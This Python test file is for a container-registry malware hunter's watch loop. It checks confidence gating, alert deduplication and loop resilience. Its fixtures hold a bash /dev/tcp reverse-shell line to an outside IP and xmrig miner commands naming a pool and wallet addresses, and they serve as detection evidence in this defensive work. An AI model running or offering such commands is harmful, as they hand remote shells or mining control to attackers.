"""Tests for the `knorr watch` long-running hunt loop (all I/O mocked).

Validates the loop mechanics -- round counting, duration exit, alert dedup,
tool exclusion, resilience to a crashing round -- and, critically, that the
alert gate is the exact same HIGH-confidence bar OSM submission uses: a
review-bucket (ENV-default wallet) or BYO-shaped finding must never alert as
if it were submission-ready.
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

from knorr.db import Database
from knorr.models import DetectionMethod, FindingStatus, ImageFinding
from knorr.scanning.confidence import wallet_to_images
from knorr.watch import (
    _alert_embed,
    _load_alerted,
    _new_confirmed_findings,
    _save_alerted,
    watch,
)

# A non-crypto Tier-A confirming line: unconditionally "high" confidence
# regardless of wallet/command shape, so tests not specifically about
# crypto confidence tiering can use this default without fabricating a wallet.
_REVSHELL_CONFIRMING = [{"category": "reverse_shell", "rule": "bash-tcp",
                        "evidence": "bash -i >&/dev/tcp/1.2.3.4/80 0>&1"}]


def _insert(db, image, *, status=FindingStatus.CONFIRMED, evidence=None,
           tier="A:reverse_shell", confirming=None, pull_count=100):
    f = ImageFinding(image=image, status=status, tier=tier,
                     detection_method=DetectionMethod.HUB_SEARCH, publisher=image.split("/")[0])
    confirming = _REVSHELL_CONFIRMING if confirming is None else confirming
    db.conn.execute(
        "INSERT OR REPLACE INTO image_findings "
        "(image, reference, digest, detection_method, status, score, signals, reasoning, "
        "publisher, pull_count, osm_severity, osm_tags, attribution, tier, confirming, "
        "evidence, first_seen_run, last_seen_run) VALUES "
        "(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (image, "latest", None, str(f.detection_method), str(status), 10, "[]", "",
         f.publisher, pull_count, None, "[]", None, tier, json.dumps(confirming),
         json.dumps(evidence or {}), "run-1", "run-1"))
    db.conn.commit()


def _wm(db):
    return wallet_to_images(db)


# ---------------------------------------------------------------------------
# _new_confirmed_findings: baseline / alerted / tool exclusion / confidence gate
# ---------------------------------------------------------------------------

def test_new_confirmed_excludes_baseline(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner")
    out = _new_confirmed_findings(db, baseline={"evil/miner"}, alerted=set(), wallet_map=_wm(db))
    assert out == []


def test_new_confirmed_excludes_already_alerted(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner")
    out = _new_confirmed_findings(db, baseline=set(), alerted={"evil/miner"}, wallet_map=_wm(db))
    assert out == []


def test_new_confirmed_excludes_likely_tool(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "metal3d/xmrig", evidence={"likely_tool": True})
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    assert out == []


def test_new_confirmed_excludes_no_confirming_evidence(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner", confirming=[])
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    assert out == []


def test_new_confirmed_includes_genuine_high_confidence_finding(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner")  # default: A:reverse_shell, unconditionally high
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    assert [r["image"] for r in out] == ["evil/miner"]


def test_new_confirmed_ignores_non_confirmed_status(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner", status=FindingStatus.SCREENED)
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    assert out == []


def test_new_confirmed_excludes_env_default_wallet_review_bucket(tmp_path):
    """The core fix: a cryptojacking finding whose wallet is only an ENV
    assignment (madebytimo/xmrig: WALLET_ADDRESS=...) is 'review' confidence,
    not 'high' -- it must NOT alert as if it were submission-ready."""
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "madebytimo/xmrig", tier="A:cryptojacking",
           confirming=[{"category": "cryptomining", "rule": "monero-wallet",
                        "evidence": "WALLET_ADDRESS=8BxBCFFvjozLXKVrn75xUijajMtyvMaNrHsRQEAAR"
                                    "kpeYTacwG9NLwpAaM9Q6hfFaK4TSJKxfpL5AgJ9"}])
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    assert out == []


def test_new_confirmed_excludes_byo_tool(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "giansalex/monero-miner", tier="A:cryptojacking",
           confirming=[{"category": "cryptomining", "rule": "miner-binary",
                        "evidence": "./xmrig --url=$POOL --user=$WALLET"}])
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    assert out == []


def test_new_confirmed_includes_literal_command_wallet(tmp_path):
    """A wallet welded directly into the command (not an ENV assignment) IS
    high confidence, and must alert."""
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "shahzaadt/xmrig", tier="A:cryptojacking", pull_count=58482,
           confirming=[{"category": "cryptomining", "rule": "miner-wallet-flag",
                        "evidence": "--url=pool.supportxmr.com:3333 "
                                    "--user=43MvHxPaDfjW5t1ym6pPUVRKQDfaPMfonbpezViDUyCNNVKJCTY"}])
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    assert [r["image"] for r in out] == ["shahzaadt/xmrig"]


def test_new_confirmed_includes_shared_wallet_sibling(tmp_path):
    """A finding whose own command looks BYO/ENV-default, but whose wallet
    matches an already-confirmed high-confidence image, is promoted to high
    (the isukim/donafro fleet pattern)."""
    db = Database.open(tmp_path / "w.sqlite")
    wallet = "43i1cxpebxKJsLjV4KD5uKJS5Sbqse3TQ6eS8ZSNq6WGUpDXqJDbyXCgd1ZdChNmniKSgBefU1AYtYyi4fP4m"
    # evidence.iocs.wallets is what wallet_to_images() actually reads (populated
    # by hunt.py's _capture_iocs during a real run); confirming is the separate
    # raw-proof-line field. Both must be set for the shared-wallet map to see it.
    _insert(db, "isukim/srbminer", tier="A:cryptojacking",
           confirming=[{"category": "cryptomining", "rule": "miner-wallet-flag",
                        "evidence": f"--wallet {wallet}"}],
           evidence={"iocs": {"wallets": [wallet]}})
    _insert(db, "isukim/rebrand", tier="A:cryptojacking",
           confirming=[{"category": "cryptomining", "rule": "monero-wallet",
                        "evidence": f"WALLET={wallet}"}],
           evidence={"iocs": {"wallets": [wallet]}})
    out = _new_confirmed_findings(db, baseline=set(), alerted=set(), wallet_map=_wm(db))
    images = {r["image"] for r in out}
    assert "isukim/rebrand" in images


# ---------------------------------------------------------------------------
# _alert_embed: matches what would actually be submitted to OSM
# ---------------------------------------------------------------------------

def test_alert_embed_docker_hub_link(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner", evidence={"iocs": {"pools": ["p:3333"], "wallets": ["w"]}})
    row = db.conn.execute("SELECT * FROM image_findings WHERE image='evil/miner'").fetchone()
    embed = _alert_embed(row)
    assert embed["url"] == "https://hub.docker.com/r/evil/miner"


def test_alert_embed_ghcr_link(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "ghcr.io/evil/miner")
    row = db.conn.execute("SELECT * FROM image_findings WHERE image='ghcr.io/evil/miner'").fetchone()
    embed = _alert_embed(row)
    assert embed["url"] == "https://ghcr.io/evil/miner"


def test_alert_embed_dockerfile_uses_stashed_github_url(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "github.com/org/repo:dockerfile",
           evidence={"dockerfile_url": "https://github.com/org/repo/blob/abc/Dockerfile"})
    row = db.conn.execute(
        "SELECT * FROM image_findings WHERE image='github.com/org/repo:dockerfile'").fetchone()
    embed = _alert_embed(row)
    assert embed["url"] == "https://github.com/org/repo/blob/abc/Dockerfile"


def test_alert_embed_shows_confidence_and_severity(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner")
    row = db.conn.execute("SELECT * FROM image_findings WHERE image='evil/miner'").fetchone()
    embed = _alert_embed(row)
    names = {f["name"]: f["value"] for f in embed["fields"]}
    assert names["Confidence"] == "HIGH, submission-eligible"
    assert names["Severity"] == "CRITICAL"  # reverse_shell tier


def test_alert_embed_shows_proof_line(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner")
    row = db.conn.execute("SELECT * FROM image_findings WHERE image='evil/miner'").fetchone()
    embed = _alert_embed(row)
    proof_fields = [f for f in embed["fields"] if f["name"].startswith("Proof:")]
    assert len(proof_fields) == 1
    assert "/dev/tcp/1.2.3.4/80" in proof_fields[0]["value"]


def test_alert_embed_omits_crypto_fields_for_non_crypto_finding(tmp_path):
    """A reverse-shell finding has no miner/pool/wallet -- those fields must
    not appear at all (not even as empty placeholders)."""
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/backdoor")  # default: reverse_shell, no iocs in evidence
    row = db.conn.execute("SELECT * FROM image_findings WHERE image='evil/backdoor'").fetchone()
    embed = _alert_embed(row)
    names = {f["name"] for f in embed["fields"]}
    assert not ({"Miner", "Pool", "Coin", "Payout wallet"} & names)


def test_alert_embed_includes_crypto_fields_when_present(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    _insert(db, "evil/miner", tier="A:cryptojacking",
           evidence={"iocs": {"miners": ["xmrig"], "pools": ["p:3333"],
                              "wallets": ["w" * 50], "coin": "Monero (XMR)"}})
    row = db.conn.execute("SELECT * FROM image_findings WHERE image='evil/miner'").fetchone()
    embed = _alert_embed(row)
    names = {f["name"]: f["value"] for f in embed["fields"]}
    assert names["Miner"] == "xmrig"
    assert names["Coin"] == "Monero (XMR)"
    assert names["Pool"] == "p:3333"
    assert "Payout wallet" in names


# ---------------------------------------------------------------------------
# _load_alerted / _save_alerted: persistence round-trip
# ---------------------------------------------------------------------------

def test_alerted_persistence_round_trip(tmp_path):
    path = tmp_path / "alerted.json"
    _save_alerted(path, {"a/b", "c/d"})
    assert _load_alerted(path) == {"a/b", "c/d"}


def test_load_alerted_missing_file_returns_empty(tmp_path):
    assert _load_alerted(tmp_path / "nope.json") == set()


# ---------------------------------------------------------------------------
# watch(): loop mechanics (rounds, duration, alerting, resilience)
# ---------------------------------------------------------------------------

def test_watch_runs_until_duration_elapses(tmp_path, monkeypatch):
    """A short, fake clock: the loop must stop once the duration elapses,
    without sleeping for real."""
    db_path = tmp_path / "w.sqlite"
    Database.open(db_path).close()

    fake_time = {"t": 1000.0}
    monkeypatch.setattr("knorr.watch.time.time", lambda: fake_time["t"])

    def fake_sleep(seconds):
        fake_time["t"] += seconds

    monkeypatch.setattr("knorr.watch.time.sleep", fake_sleep)

    def advancing_hunt(*args, **kwargs):
        fake_time["t"] += 100  # each "round" advances the clock

    with patch("knorr.watch._run_one_hunt", side_effect=advancing_hunt), \
        patch("knorr.watch._pull_budget", return_value=100), \
        patch("knorr.watch._post_alert", return_value=True):
        summary = watch(duration_seconds=350, db_path=db_path, webhook=None,
                        registries=["docker"], round_pause=10)

    assert summary["rounds"] >= 3  # 350s / ~110s-per-round(100 hunt + 10 pause) ~ 3 rounds


def test_watch_alerts_on_new_high_confidence_finding(tmp_path, monkeypatch):
    db_path = tmp_path / "w.sqlite"
    Database.open(db_path).close()

    fake_time = {"t": 1000.0}
    monkeypatch.setattr("knorr.watch.time.time", lambda: fake_time["t"])
    monkeypatch.setattr("knorr.watch.time.sleep", lambda s: fake_time.update(t=fake_time["t"] + s))

    def hunt_that_confirms(registry, db_path, tier1_limit, limit, pace):
        db = Database.open(db_path)
        _insert(db, "evil/newminer")  # default: A:reverse_shell, unconditionally high
        db.close()
        fake_time["t"] += 1000  # end the loop after one round

    posted = []
    with patch("knorr.watch._run_one_hunt", side_effect=hunt_that_confirms), \
        patch("knorr.watch._pull_budget", return_value=100), \
        patch("knorr.watch._post_alert", side_effect=lambda wh, embed: posted.append(embed) or True):
        summary = watch(duration_seconds=500, db_path=db_path, webhook="https://example/hook",
                        registries=["docker"], round_pause=10)

    assert summary["new_alerts"] == 1
    titles = [e["title"] for e in posted]
    assert any("evil/newminer" in t for t in titles)


def test_watch_does_not_alert_on_review_bucket_finding(tmp_path, monkeypatch):
    """End-to-end proof of the fix: a round that only confirms a review-bucket
    (ENV-default wallet) cryptojacker must alert ZERO times."""
    db_path = tmp_path / "w.sqlite"
    Database.open(db_path).close()

    fake_time = {"t": 1000.0}
    monkeypatch.setattr("knorr.watch.time.time", lambda: fake_time["t"])
    monkeypatch.setattr("knorr.watch.time.sleep", lambda s: fake_time.update(t=fake_time["t"] + s))

    def hunt_that_confirms_review_only(registry, db_path, tier1_limit, limit, pace):
        db = Database.open(db_path)
        _insert(db, "madebytimo/xmrig", tier="A:cryptojacking",
               confirming=[{"category": "cryptomining", "rule": "monero-wallet",
                            "evidence": "WALLET_ADDRESS=8BxBCFFvjozLXKVrn75xUijajMtyvMaNrHsRQE"
                                        "AARkpeYTacwG9NLwpAaM9Q6hfFaK4TSJKxfpL5AgJ9"}])
        db.close()
        fake_time["t"] += 1000

    posted = []
    with patch("knorr.watch._run_one_hunt", side_effect=hunt_that_confirms_review_only), \
        patch("knorr.watch._pull_budget", return_value=100), \
        patch("knorr.watch._post_alert", side_effect=lambda wh, embed: posted.append(embed) or True):
        summary = watch(duration_seconds=500, db_path=db_path, webhook="https://example/hook",
                        registries=["docker"], round_pause=10)

    assert summary["new_alerts"] == 0
    # the start/complete messages still post; only the per-finding alert must be absent
    finding_alerts = [e for e in posted if e.get("title", "").startswith("Confirmed malicious")]
    assert finding_alerts == []


def test_watch_skips_docker_round_when_budget_low(tmp_path, monkeypatch):
    db_path = tmp_path / "w.sqlite"
    Database.open(db_path).close()
    fake_time = {"t": 1000.0}
    monkeypatch.setattr("knorr.watch.time.time", lambda: fake_time["t"])
    monkeypatch.setattr("knorr.watch.time.sleep", lambda s: fake_time.update(t=fake_time["t"] + s))

    hunt_mock = MagicMock()
    with patch("knorr.watch._run_one_hunt", hunt_mock), \
        patch("knorr.watch._pull_budget", return_value=5), \
        patch("knorr.watch._post_alert", return_value=True):
        watch(duration_seconds=15, db_path=db_path, webhook=None,
              registries=["docker"], round_pause=20)

    hunt_mock.assert_not_called()  # budget too low; round skipped, not attempted


def test_run_one_hunt_is_exception_guarded():
    """watch() itself has no extra try/except around a round; the guarantee
    that one bad round never kills the whole watch loop lives INSIDE
    _run_one_hunt. Pin that invariant directly on the real (unpatched)
    function, since mocking it in a loop test would only prove the mock."""
    import inspect

    from knorr.watch import _run_one_hunt
    source = inspect.getsource(_run_one_hunt)
    assert "except Exception" in source


def test_run_one_hunt_swallows_a_crashing_run_hunt():
    """A run_hunt() call that raises must not propagate out of _run_one_hunt."""
    from knorr.watch import _run_one_hunt
    with patch("knorr.hunt.run_hunt", side_effect=RuntimeError("simulated crash")):
        _run_one_hunt("docker", Path("unused.sqlite"), 10, 1, 0.0)  # must not raise
